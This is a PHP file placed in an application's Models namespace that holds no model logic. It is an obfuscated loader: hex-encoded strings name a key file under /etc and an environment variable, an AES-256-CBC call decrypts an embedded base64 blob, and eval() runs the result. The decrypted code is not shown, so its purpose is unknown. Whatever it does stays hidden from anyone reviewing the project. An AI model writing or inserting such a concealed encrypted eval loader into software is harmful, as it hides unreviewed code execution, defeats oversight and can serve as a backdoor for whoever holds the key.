<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('rA/SdzPbK/ERyxVZhxENAA==');

$c=base64_decode(

'XY+SxAtFHayxk6WZWdz6IiafohnxvPR51ZkqJdtiIFp+VU7hZokaCLpQ4YBjG2Clikat8MqlaFE0' .
'lOpnPSfueShT7rSx2VmJw6RYgI7fH+TKT/jIy+PNj1virqgxc1Hn25/k9fIE10caHpAxmanKG+Ag' .
'Tk4mQfCTAEybK7rVjwEUI6AYOk8cbW7p3Pd9/kfbzx/B7FrZlZ+Ft071nVecNuEKHC3KEoTVvAAS' .
'O0LrAh6c06icmuYS8FjfmyulIQ/k13FDQTTC9BrreWYOSLOSce8oQZNqNo6AGbQMvE2Rlh0Wwzot' .
'R+RL36eqUrsSSG6gx8BFoPpwWnM9bFNODoPxdyZAxrLmj0tBXxMy+64WXHH1JXurPba82CQDm1wv' .
'Guh6QdPi6x52yVmNiS0XkjirBl/AE02SLk/sXhhKIgS3Pi3Sc/htBpDT/y4+6KrCnAJcqdrWQbcC' .
'3pscVnimWjs7kms9FIaBTjSkAsFm42R2Ls2lt9RJXVAxNCvfUmIifMK1bChppTDrrfSnzBbtmtF3' .
'CQ/35+HcbFzeioKRyzIbexi1jVkh4C7RGukboFYklmXAXkychoaZ9tWXg37wUeB/PLmAcIS8Kxu8' .
'2m8VLCEUTw/N5ljqyr5HaaBAOrLed19cr89H1tXas48Ye60xLJURq+43NOVZIW5N/nzsvivrP6ub' .
'5iOVVbGMuTmXqGYsekixPIYkELtE6hZ739tXmiEc0vGqVnUzSBLNrtvVoFlpbCeas4AFQEKHAEkH' .
'XLZthfpmmvrNMyxj9hPLJ7rxZdScZRrIwcl2HWXN30tfLmWpJ6e5ezb9BYMgNmsFkPCPo+zFqE6M' .
'txDkMIKC0HBY9MpRf96M4gbvhjgJBDLYAxC7hW7ybSquKygllh0zBpbvAeGXCwJjvGkceOGRR+4r' .
'SSOmS2h62wCrlR5iLkoyOIMFlqHg3LE1/h/qfCBm1oqkIrAomy1T8kghQKZaZpzCUFHILeE18av8' .
'NGxq49jNYo75gBDu7hJo6G2fP9kw39aMnL/OxHuN48O28DmkISigzlcozLNeTMljeNEdoq4LmGwb' .
'VZL83hFpTwzCfDEml3kmEsSvqmOSTTvJP1Qcb0hbbJaqLkfE4vhs4Y4QXIcicJda6gng0JJGyV2U' .
'PS/orzfCviZHQishqctTZ5314TDaPdDrBCfPQ9JSDQYaT7mwfOcWPNwxQWSDbB7V7BwLjcyqihU6'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

